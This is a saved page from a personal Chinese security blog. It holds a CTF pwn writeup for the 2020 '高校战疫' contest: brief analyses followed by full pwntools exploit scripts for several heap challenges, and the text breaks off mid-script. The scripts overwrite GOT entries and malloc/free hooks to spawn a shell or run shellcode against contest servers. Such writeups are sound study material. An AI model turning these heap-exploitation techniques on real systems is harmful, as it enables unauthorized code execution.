@@ -1,0 +1,1743 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="utf-8">
+  <title>2020-高校战疫-writeup-PWN | t1an5t&#39;s Treasure</title>
+  <meta name="keywords" content=" pwnable , writeup ">
+  <meta name="description" content="2020-高校战疫-writeup-PWN | t1an5t&#39;s Treasure">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="初步分析资料[1]里面有下载链接。 在我的1604下直接用run.sh就跑起来了，没有用户名密码了，qemu起来就是root权限。怪不得给了个内核镜像，打开是一个小型文件系统。 还是先看run.sh： ./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-">
+<meta name="keywords" content="pwnable,qemu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Q之逃逸-贰之型-DefconQuals-2018-EC3">
+<meta property="og:url" content="http://tianstcht.github.io/Q之逃逸-贰之型-DefconQuals-2018-EC3/index.html">
+<meta property="og:site_name" content="t1an5t&#39;s Treasure">
+<meta property="og:description" content="初步分析资料[1]里面有下载链接。 在我的1604下直接用run.sh就跑起来了，没有用户名密码了，qemu起来就是root权限。怪不得给了个内核镜像，打开是一个小型文件系统。 还是先看run.sh： ./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583376685229.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583377151569.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583377415477.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583377697351.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583391188360.png">
+<meta property="og:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/EC3.gif">
+<meta property="og:updated_time" content="2020-03-09T14:30:03.997Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Q之逃逸-贰之型-DefconQuals-2018-EC3">
+<meta name="twitter:description" content="初步分析资料[1]里面有下载链接。 在我的1604下直接用run.sh就跑起来了，没有用户名密码了，qemu起来就是root权限。怪不得给了个内核镜像，打开是一个小型文件系统。 还是先看run.sh： ./qemu-system-x86_64 -initrd ./initramfs-busybox-x86_64.cpio.gz -nographic -kernel ./vmlinuz-4.4.0-">
+<meta name="twitter:image" content="http://tianstcht.github.io/Q%E4%B9%8B%E9%80%83%E9%80%B8-%E8%B4%B0%E4%B9%8B%E5%9E%8B-DefconQuals-2018-EC3/1583376685229.png">
+
+<link rel="alternate" href="/atom.xml" title="t1an5t&#39;s Treasure" type="application/atom+xml">
+
+
+<link rel="icon" href="/img/djcx.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-dark.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1"></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
+
+<script src="/js/iconfont.js?v=1.0.1"></script>
+
+</head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value>
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/djcx.jpg" />
+</a>
+<div class="author">
+    <span>t1an5t</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/tianstcht" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="email" href="mailto:1037178204@qq.com" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-email"></use>
+                </svg>
+            
+        </a>
+        
+    
+        
+        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=1037178204&site=qq&menu=yes" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-qq"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(22)</small></div></li>
+    
+        
+            
+            <li><div data-rel="CTF">CTF<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="PWN">PWN<small>(7)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="RE">RE<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="QEMU">QEMU<small>(4)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="NOTES">NOTES<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="TIPS">TIPS<small>(3)</small></div>
+                
+            </li>
+            
+        
+    
+        
+            
+            <li><div data-rel="ME">ME<small>(1)</small></div>
+                
+            </li>
+            
+        
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    
+    </div>
+    <div><a class="about  hasFriend  site_url"  href="/">关于</a><a style="width: 50%"  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="22">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="http://handsomedog.top/">WangTsiAo</a></li>
+            
+            <li><a target="_blank" href="http://http://igml.top/">gml</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">ctf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">pwnable</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">2019</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">reverse</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">writeup</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color5">qemu</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">elf</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">kernel</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">pwntools</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color1">glibc</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color3">tw</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class="CTF "
+           href="/2019-CISCN-东北赛区线下赛-writeup-PWN/"
+           data-tag="ctf,pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-CISCN-东北赛区线下赛-writeup-PWN">2019-CISCN-东北赛区线下赛-writeup-PWN</span>
+            <span class="post-date" title="2019-06-23 21:13:37">2019/06/23</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-ByteCTF-writeup-PWN/"
+           data-tag="ctf,pwnable,2019"
+           data-author="" >
+            <span class="post-title" title="2019-ByteCTF-writeup-PWN">2019-ByteCTF-writeup-PWN</span>
+            <span class="post-date" title="2019-09-19 22:33:33">2019/09/19</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-DEFCON-CTF-babyheap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-DEFCON-CTF-babyheap">2019-DEFCON-CTF-babyheap</span>
+            <span class="post-date" title="2020-02-09 11:19:00">2020/02/09</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-realloc_magic/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-realloc_magic">2019-ROAR-CTF-realloc_magic</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-ez_op/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-ez_op">2019-ROAR-CTF-ez_op</span>
+            <span class="post-date" title="2020-02-07 11:02:00">2020/02/07</span>
+        </a>
+        
+        <a  class="CTF "
+           href="/2019-NEX招新赛-writeup-PWN/"
+           data-tag="ctf,pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-NEX招新赛-writeup-PWN">2019-NEX招新赛-writeup-PWN</span>
+            <span class="post-date" title="2019-10-27 21:52:33">2019/10/27</span>
+        </a>
+        
+        <a  class="RE "
+           href="/2020-网络安全公益赛-writeup-RE/"
+           data-tag="reverse,writeup"
+           data-author="" >
+            <span class="post-title" title="2020-网络安全公益赛-writeup-RE">2020-网络安全公益赛-writeup-RE</span>
+            <span class="post-date" title="2020-02-26 23:01:00">2020/02/26</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2019-ROAR-CTF-easy_heap/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="2019-ROAR-CTF-easy_heap">2019-ROAR-CTF-easy_heap</span>
+            <span class="post-date" title="2020-02-06 10:52:00">2020/02/06</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-叁之型-HITB-CTF-2017-babyqemu/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-叁之型-HITB-CTF-2017-babyqemu">Q之逃逸-叁之型-HITB-CTF-2017-babyqemu</span>
+            <span class="post-date" title="2020-03-05 20:49:00">2020/03/05</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/ELF文件在加载过程中需要关注的部分/"
+           data-tag="elf"
+           data-author="" >
+            <span class="post-title" title="ELF文件在加载过程中需要关注的部分">ELF文件在加载过程中需要关注的部分</span>
+            <span class="post-date" title="2020-02-06 18:01:20">2020/02/06</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/2020-高校战疫-writeup-PWN/"
+           data-tag="pwnable,writeup"
+           data-author="" >
+            <span class="post-title" title="2020-高校战疫-writeup-PWN">2020-高校战疫-writeup-PWN</span>
+            <span class="post-date" title="2020-03-09 22:22:00">2020/03/09</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/KERNEL-CSAW-2010-kernel/"
+           data-tag="pwnable,kernel"
+           data-author="" >
+            <span class="post-title" title="KERNEL-CSAW-2010-kernel">KERNEL-CSAW-2010-kernel</span>
+            <span class="post-date" title="2019-06-20 19:42:11">2019/06/20</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-壹之型-Blizzard-CTF-2017-Strng/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-壹之型-Blizzard-CTF-2017-Strng">Q之逃逸-壹之型-Blizzard-CTF-2017-Strng</span>
+            <span class="post-date" title="2020-03-04 20:19:00">2020/03/04</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-贰之型-DefconQuals-2018-EC3/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-贰之型-DefconQuals-2018-EC3">Q之逃逸-贰之型-DefconQuals-2018-EC3</span>
+            <span class="post-date" title="2020-03-09 22:23:12">2020/03/09</span>
+        </a>
+        
+        <a  class="QEMU "
+           href="/Q之逃逸-零之型-基础知识集合/"
+           data-tag="pwnable,qemu"
+           data-author="" >
+            <span class="post-title" title="Q之逃逸-零之型-基础知识集合">Q之逃逸-零之型-基础知识集合</span>
+            <span class="post-date" title="2020-03-04 16:50:00">2020/03/04</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwntools的使用技巧/"
+           data-tag="pwnable,pwntools"
+           data-author="" >
+            <span class="post-title" title="pwntools的使用技巧">pwntools的使用技巧</span>
+            <span class="post-date" title="2019-06-19 15:26:27">2019/06/19</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc-malloc-c源码阅读笔记/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc-malloc.c源码阅读笔记">glibc-malloc.c源码阅读笔记</span>
+            <span class="post-date" title="2019-07-17 16:18:02">2019/07/17</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/pwn里的一些patch心得/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="pwn里的一些patch心得">pwn里的一些patch心得</span>
+            <span class="post-date" title="2019-06-23 21:13:57">2019/06/23</span>
+        </a>
+        
+        <a  class="PWN "
+           href="/pwnab13-7w/"
+           data-tag="pwnable,tw"
+           data-author="" >
+            <span class="post-title" title="pwnab13.7w">pwnab13.7w</span>
+            <span class="post-date" title="2019-06-19 15:14:30">2019/06/19</span>
+        </a>
+        
+        <a  class="TIPS "
+           href="/造轮子/"
+           data-tag="pwnable"
+           data-author="" >
+            <span class="post-title" title="造轮子">造轮子</span>
+            <span class="post-date" title="2019-06-19 15:40:33">2019/06/19</span>
+        </a>
+        
+        <a  class="ME "
+           href="/t1an5t的2020/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="t1an5t的2020">t1an5t的2020</span>
+            <span class="post-date" title="1999-01-01 15:13:07">1999/01/01</span>
+        </a>
+        
+        <a  class="NOTES "
+           href="/glibc2.30代码阅读/"
+           data-tag="glibc"
+           data-author="" >
+            <span class="post-title" title="glibc2.30代码阅读笔记">glibc2.30代码阅读笔记</span>
+            <span class="post-date" title="2020-02-14 20:26:20">2020/02/14</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-2020-高校战疫-writeup-PWN" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">2020-高校战疫-writeup-PWN</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        <span class="book">
+            
+                <a  data-rel="PWN">PWN</a>
+            
+        </span>
+        
+        
+        <span class="tag">
+            
+            <a class="color3">pwnable</a>
+            
+            <a class="color3">writeup</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-03-09 22:28:45'>2020-03-09 22:22</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easyheap"><span class="toc-text">easyheap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#woodenbox"><span class="toc-text">woodenbox</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lgd"><span class="toc-text">lgd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#shortest-path"><span class="toc-text">shortest_path</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#kenoob"><span class="toc-text">kenoob</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bjut"><span class="toc-text">bjut</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#musl"><span class="toc-text">musl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babykernel"><span class="toc-text">babykernel</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babykernel2"><span class="toc-text">babykernel2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#rustpad"><span class="toc-text">rustpad</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-vm"><span class="toc-text">easy_vm</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-unicorn"><span class="toc-text">easy_unicorn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#twochunk"><span class="toc-text">twochunk</span></a></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次比赛体验还是很好的，自己出的twochunk难住了很多队的师傅很开心hh，同时也是自己离AK最近的一次了，就差了一道hhh，希望以后还有这种高光时刻把。装逼截图记录一下：</p>
+<p><img src="/2020-%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-writeup-PWN/1583753262235.png" alt="1583753262235"></p>
+<h2 id="easyheap"><a href="#easyheap" class="headerlink" title="easyheap"></a>easyheap</h2><p>add里就算开辟失败也可以生成信息堆块，如果可以利用fastbin里的残留堆块，进行布局操作。</p>
+<p>我一开始的操作虽然可以做不过爆破概率有点低，最后是学弟顺着漏洞改了下，做出来的。我的1/4096的脚本：</p>
+<pre><code class="python">#
+# @ Author: t1an5t
+# @ Version: 0.3
+#
+from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#context.log_level=&quot;debug&quot;
+
+#p = process(&quot;./easyheap&quot;)
+# proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)] # get the base address in PIE
+
+p = remote(&quot;121.36.209.145&quot;, 9997)
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def debug(cmd):
+    gdb.attach(p, cmd)
+
+def choose(idx):
+    sla(&quot;:\n&quot;, str(idx))
+
+def add(sz, ctx):
+    choose(1)
+    sa(&quot;?\n&quot;, str(sz))
+    sa(&quot;?\n&quot;, ctx)
+
+def add_err():
+    choose(1)
+    sa(&quot;?\n&quot;, str(0x401))
+
+def edit(idx, ctx):
+    choose(3)
+    sla(&quot;?\n&quot;, str(idx))
+    sa(&quot;?\n&quot;, ctx)
+
+def free(idx):
+    choose(2)
+    sla(&quot;?\n&quot;, str(idx))
+
+elf = ELF(&quot;./easyheap&quot;)
+cmd = &quot;set $a=0x6020c0\n&quot;
+#cmd += &quot;b *0x400B3E\n&quot; # read in edit
+#cmd += &quot;b * 0x4009CE\n&quot; # read in add
+#cmd += &quot;b* 0x400966\n&quot; # jle in add
+#debug(cmd)
+
+add(0x80, &quot;0&quot;) # fake
+
+add(0x10, &quot;0&quot;)
+
+free(1)
+free(0)
+add_err()
+
+edit(0, flat(0, 0x21)+&quot;\x00&quot;)
+
+add(0x10, p64(elf.got[&#39;free&#39;]))
+
+edit(0, &quot;\x90\x23\xa5&quot;)
+edit(1, &quot;/bin/sh\x00&quot;)
+
+free(1)
+p.interactive()</code></pre>
+<h2 id="woodenbox"><a href="#woodenbox" class="headerlink" title="woodenbox"></a>woodenbox</h2><p>很明显的堆溢出，最后那个双free明显是让你写one_gadget。整个堆结构是个单向链表，free的时候尾链存在double free。unsortedbin attack打global_max_fast，然后用stdout上方的0xff堆块泄露，最后写malloc_hook为one_gadget。</p>
+<pre><code class="python">#
+# @ Author: t1an5t
+# @ Version: 0.3
+#
+from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+#context.log_level=&quot;debug&quot;
+
+#p = process(&quot;./woodenbox2&quot;)
+#proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)] # get the base address in PIE
+p = remote(&quot;121.36.215.224&quot;, 9998)
+
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def debug(cmd):
+    gdb.attach(p, cmd)
+
+def choose(idx):
+    sla(&quot;:&quot;, str(idx))
+
+def add(sz, ctx):
+    choose(1)
+    sla(&quot;:&quot;, str(sz))
+    sa(&quot;:&quot;, ctx)
+
+def edit(idx, sz, ctx):
+    choose(2)
+    sla(&quot;:&quot;, str(idx))
+    sla(&quot;:&quot;, str(sz))
+    sa(&quot;:&quot;, ctx)
+
+def free(idx):
+    choose(3)
+    sla(&quot;:&quot;, str(idx))
+
+libc = ELF(&quot;./libc.so&quot;)
+
+#cmd = &quot;set $a=%d\n&quot; %(proc_base+0x2020a8) # chunk_bss
+#cmd += &quot;set $b=%d\n&quot; %(proc_base+0x2020A0) # item
+
+#debug(cmd)
+
+add(0x100, &quot;ttt&quot;) # 0
+add(0x100, &quot;ttt&quot;) # 1
+add(0x100, &quot;ttt&quot;) # 2
+
+for i in range(7):
+    add(0x68, &quot;ttt&quot;)
+
+add(0xe8, &quot;a&quot;)
+add(0xe8, &quot;a&quot;)
+
+# unsortedbin
+free(2)
+
+ # overwrite to attack global_max_fast-0x10
+edit(0, 0x200, &quot;\x00&quot;*0x100+p64(0)+p64(0x111)+p64(0)+&quot;\xe8\x37&quot;)
+#edit(0, 0x200, &quot;aa&quot;)
+
+# unsortedbin attack
+add(0x108, &quot;a&quot;)
+
+
+free(10)
+edit(11, 0x20, &quot;\xcf\x25&quot;)
+
+free(1)
+add(0xe8, &quot;a&quot;)
+add(0xe8, &quot;a&quot;)
+edit(8, 0x100, &quot;a&quot;*0x41+p64(0xfbad1800)+&#39;\x00&#39;*25)
+
+lb = u64(ru(&quot;\x7f&quot;)[-6:].ljust(8, &quot;\x00&quot;))-0x3c5600
+success(hex(lb))
+
+
+free(6)
+free(5)
+free(4)
+
+edit(2, 0x100, &quot;\x00&quot;*0x60+p64(0)+p64(0x71)+p64(lb+libc.sym[&quot;__malloc_hook&quot;]-0x23))
+
+add(0x68, &quot;a&quot;)
+add(0x68, &quot;a&quot;)
+
+one = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
+edit(4, 0x30, &quot;a&quot;*0x13+p64(lb+one[2]))
+
+choose(4)
+p.interactive()
+</code></pre>
+<blockquote>
+<p>flag{D0_y0u_kn0w_h0o34_o7_R0m4n?}</p>
+</blockquote>
+<h2 id="lgd"><a href="#lgd" class="headerlink" title="lgd"></a>lgd</h2><p>有一个很奇怪的数据结构，是啥没看出来。<br>沙盒禁了shell，初步推测问题在edit里面。</p>
+<p>本来想跳到name上做ROP，不过没想到怎么构造。所以，最后还是搞到free_hook上去了，改成setcontext执行mprotect，然后在bss上执行shellcode：</p>
+<pre><code class="python">#
+# @ Author: t1an5t
+# @ Version: 0.3
+#
+from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level=&quot;debug&quot;
+
+#p = process(&quot;./pwn&quot;)
+# proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)] # get the base address in PIE
+
+p = remote(&quot;121.36.209.145&quot;, 9998)
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def debug(cmd):
+    gdb.attach(p, cmd)
+
+def choose(idx):
+    sla(&quot;&gt;&gt; &quot;, str(idx))
+
+def add(sz, ctx):
+    choose(1)
+    sla(&quot;?\n&quot;, str(sz))
+    sa(&quot;?\n&quot;, ctx)
+
+def free(idx):
+    choose(2)
+    sla(&quot;?\n&quot;, str(idx))
+
+def show(idx):
+    choose(3)
+    sla(&quot;?\n&quot;, str(idx))
+
+def edit(idx, ctx):
+    choose(4)
+    sla(&quot;?\n&quot;, str(idx))
+    sa(&quot;?\n&quot;, ctx)
+
+libc = ELF(&quot;./libc.so.6&quot;)
+
+cmd = &quot;set $a=%d\n&quot;%(0x6032e0) # chunk_buf
+#cmd += &quot;b *0x40208A\n&quot; # read in edit
+cmd += &quot;set $b=%d\n&quot;%(0x603260) # size?
+cmd += &quot;b *0x603340\n&quot;
+#debug(cmd)
+
+leave_ret = 0x4020A3
+p_rdi = 0x4023b3
+p_rsi = 0x4023b1
+
+name = &quot;ttt&quot;
+sa(&quot;? \n&quot;, name)
+
+add(0x100, &quot;aaa&quot;)
+add(0x200, &quot;bbb&quot;)
+
+free(0)
+add(0x20, &quot;a&quot;)
+
+show(0)
+lb = u64(ru(&quot;\x7f&quot;)[-6:].ljust(8, &quot;\x00&quot;))-0x3c4c78
+success(hex(lb))
+
+
+
+add(0x68, &quot;a&quot;)
+#edit(2, &quot;a&quot;)
+add(0x68, &quot;a&quot;*0x200)
+add(0x68, &quot;a&quot;*0x200)
+add(0x68, &quot;a&quot;*0x200)
+free(5)
+
+edit(4, &quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(lb+libc.sym[&quot;__malloc_hook&quot;]-0x23))
+
+
+add(0x68, &quot;a&quot;)
+add(0x68, &quot;a&quot;*0x100)
+
+# 0010a407 : add rsp, 0x40 ; ret
+add_rsp = lb + 0x10a407
+edit(6, &quot;a&quot;*0x13)#+p64(add_rsp))
+
+
+#cmd += &quot;b *0x400c17\n&quot; # malloc
+#debug(cmd)
+
+free(5)
+edit(4, &quot;a&quot;*0x60+p64(0)+p64(0x71)+p64(0x60330d))
+
+add(0x68, &quot;a&quot;)
+add(0x68, &quot;a&quot;*0x100)
+
+#edit(7, )
+
+add(0x100, &quot;a&quot;*0x200)
+free(8)
+
+p2 = &quot;\x00&quot;*3+p64(lb+libc.sym[&quot;__free_hook&quot;])+p64(0)*2
+p2 += p64(0x603340)+asm(shellcraft.cat(&quot;./flag&quot;))
+
+edit(7, p2)
+edit(8, p64(lb+libc.sym[&quot;setcontext&quot;]+53))
+
+# payload
+
+add(0x200, &quot;a&quot;*0x200)
+
+frame = SigreturnFrame()
+frame.rsp = 0x603330+8
+frame.rip = lb+libc.sym[&#39;mprotect&#39;] 
+frame.rdi = (0x603330 &amp; 0xfffffffffffff000)
+frame.rsi = 0x1000
+frame.rdx = 4 | 2 | 1
+p1 = str(frame)
+edit(9, p1)
+
+free(9)
+
+p.interactive()
+</code></pre>
+<blockquote>
+<p>flag{awesomenononononono!}</p>
+</blockquote>
+<h2 id="shortest-path"><a href="#shortest-path" class="headerlink" title="shortest_path"></a>shortest_path</h2><p>add里似乎是在记录点，路径什么的。</p>
+<p>qeury_route就是在找最优路径，一开始感觉这里应该有什么问题。不过最后发现flag在topchunk里，一点一点分配给带出来就行了：</p>
+<pre><code class="python">#
+# @ Author: t1an5t
+# @ Version: 0.3
+#
+from pwn import *
+context(arch = &#39;amd64&#39; , os = &#39;linux&#39;)
+context.terminal = [&#39;tmux&#39;, &#39;splitw&#39;, &#39;-h&#39;]
+context.log_level=&quot;debug&quot;
+
+#p = process(&quot;./path&quot;)
+# proc_base = p.libs()[p._cwd+p.argv[0].strip(&#39;.&#39;)] # get the base address in PIE
+
+p = remote(&quot;121.37.181.246&quot;, 19008)
+ru = lambda x : p.recvuntil(x)
+sn = lambda x : p.send(x)
+rl = lambda : p.recvline()
+sl = lambda x : p.sendline(x)
+rv = lambda x : p.recv(x)
+sa = lambda a,b : p.sendafter(a,b)
+sla = lambda a,b : p.sendlineafter(a, b)
+
+def debug(cmd):
+    gdb.attach(p, cmd)
+
+def choose(idx):
+    sla(&quot;&gt; &quot;, str(idx))
+
+def add(id, price, sz, ctx, station_numb, connected_id, connected_distance):
+    choose(1)
+    sla(&quot;: &quot;, str(id))
+    sla(&quot;: &quot;, str(price))
+    sla(&quot;: &quot;, str(sz))
+    sa(&quot;: \n&quot;, ctx)
